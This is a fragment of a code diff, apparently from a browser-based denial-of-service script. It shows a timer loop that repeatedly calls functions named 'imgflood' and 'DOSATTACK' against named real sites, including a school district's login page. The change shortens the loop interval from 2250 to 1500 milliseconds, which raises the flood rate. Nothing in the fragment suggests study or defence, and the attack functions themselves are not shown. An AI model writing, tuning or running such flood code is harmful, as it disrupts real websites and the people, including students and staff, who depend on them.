@@ -22,5 +22,5 @@ setInterval(function(){
   imgflood("ls-child.mvcsc.k12.in.us","/index.php");
   DOSATTACK("jihadology.net");
   DOSATTACK("ls-child.mvcsc.k12.in.us/log_in");
-}, 2250);
+}, 1500);
 
